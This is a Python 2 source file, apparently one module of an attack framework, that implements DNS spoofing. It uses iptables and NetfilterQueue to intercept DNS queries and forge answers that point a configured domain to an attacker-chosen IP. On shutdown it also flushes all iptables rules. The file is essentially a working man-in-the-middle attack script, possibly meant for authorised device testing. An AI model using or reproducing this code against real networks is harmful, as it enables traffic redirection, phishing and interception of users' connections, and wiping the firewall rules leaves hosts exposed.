import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from generic_attack import *
from scapy.all import *
import logging
log = logging.getLogger(__name__)
from netfilterqueue import NetfilterQueue
import traceback
import os


class DnsSpoof(GenericAttack):
    """DNS spoofing class
    """
    global domain
    global localIP
    global queue
    domain = 'test.com'  # domain to be spoofed
    localIP = 'local'  # IP address for poisoned hosts.
    queue = NetfilterQueue()

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(DnsSpoof, self).__init__(attackName, attackConfig, deviceConfig)


    def callback(self, packet):
        payload = packet.get_payload()
        pkt = IP(payload)
        global domain
        global localIP
        if not pkt.haslayer(DNSQR):
            packet.accept()
        else:
            if domain in pkt[DNS].qd.qname:
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
                packet.set_payload(str(spoofed_pkt))
                packet.accept()
            else:
                packet.accept()

    def initialize(self, result):
        os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
        global domain
        global localIP
        global queue
        localIP = self.config["poisoned_ip"]
        domain = self.config["domain"]
        self.running = True
        queue.bind(1, self.callback)
        try:
            queue.run()  # Main loop
        except KeyboardInterrupt:
            queue.unbind()
            os.system('iptables -F')
            os.system('iptables -X')
        return

    def shutdown(self):
        self.running = False
        global queue
        try:
            queue.unbind()
            os.system('iptables -F')
            os.system('iptables -X')
        except Exception, j:
            log.error('Error unbinding DNS' % (j, traceback.format_exc()))
            pass
        return True

